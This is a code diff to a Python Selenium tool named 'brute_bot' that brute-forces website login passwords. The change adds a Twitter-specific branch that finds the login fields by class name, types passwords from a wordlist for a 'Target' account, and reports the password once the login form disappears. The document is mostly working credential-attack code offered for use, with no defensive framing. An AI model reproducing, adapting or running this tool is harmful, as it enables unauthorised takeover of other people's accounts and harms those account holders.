@@ -28,26 +28,48 @@ class brute_bot(object):
         driver = self.driver
         pass_found = False
 
-        while not pass_found:
-            driver.get(self.site)
-            time.sleep(3)
-            for i in self.password:
-                try:
-                    email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
-                    email_box.clear()
-                    email_box.send_keys(self.email)   
-                    password_box = driver.find_element_by_xpath(f"//input[@name='{self.pass_field}']")
-                    password_box.clear()
-                    password_box.send_keys(i)
-                    pyautogui.press('enter')
-                    time.sleep(4)
-                    old = i 
-                    print(f"Trying - {i}") 
-                except NoSuchElementException: 
-                    pass_found = True 
-                    if pass_found == True: 
-                        print(f'Password is >> {old} ')
-                        break
+        if sys.argv[1] != "twitter":
+            while not pass_found:
+                driver.get(self.site)
+                time.sleep(3)
+                for i in self.password:
+                    try:
+                        email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
+                        email_box.clear()
+                        email_box.send_keys(self.email)   
+                        password_box = driver.find_element_by_xpath(f"//input[@name='{self.pass_field}']")
+                        password_box.clear()
+                        password_box.send_keys(i)
+                        pyautogui.press('enter')
+                        time.sleep(4)
+                        old = i 
+                        print(f"Trying - {i}") 
+                    except NoSuchElementException: 
+                        pass_found = True 
+                        if pass_found == True: 
+                            print(f'Password is >> {old} ')
+                            break
+        else:
+            while not pass_found:
+                driver.get(self.site)
+                time.sleep(3)
+                for i in self.password:
+                    try:
+                        email_box = driver.find_element_by_class_name(f'{self.email_field}')
+                        email_box.clear()
+                        email_box.send_keys(self.email)   
+                        password_box = driver.find_element_by_class_name(f'{self.pass_field}')
+                        password_box.clear()
+                        password_box.send_keys(i)
+                        pyautogui.press('enter')
+                        time.sleep(4)
+                        old = i 
+                        print(f"Trying - {i}") 
+                    except NoSuchElementException: 
+                        pass_found = True 
+                        if pass_found == True: 
+                            print(f'Password is >> {old} ')
+                            break
 
 banner = """\n\t
 
@@ -95,8 +117,8 @@ def main_menu():
         site = "https://twitter.com/login/"
         print(banner)
         print("Waking up BOT...")
-        efield = 'username_or_email'
-        pfield = 'password'
+        efield = 'js-username-field'
+        pfield = 'js-password-field'
         time.sleep(2)
         email1 = str(input("\nThe Username/Email of the Target >> "))
         target = open(sys.argv[2])
